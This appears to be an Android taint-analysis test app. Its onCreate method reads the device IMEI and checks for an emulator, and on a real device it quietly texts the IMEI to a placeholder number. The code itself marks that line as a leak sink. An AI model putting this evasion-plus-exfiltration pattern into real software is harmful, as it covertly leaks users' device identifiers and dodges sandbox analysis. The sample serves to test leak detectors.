package com.example.newedtester;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;
		

		String status = "Can't Detect";
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = tm.getDeviceId(); 
	    int i = imei.compareTo("000000000000000");
	   
	     if (i==0)
	     {
	     	status = " \tDeviceId: Emulator";
	     }
	     else
	     {
	    	 
				SmsManager sm = SmsManager.getDefault();
		    	String number = "+49 1234";
		    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
	    	 status = " \tDeviceId:Device";
	     }
	   	txtStatus.setText(status);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}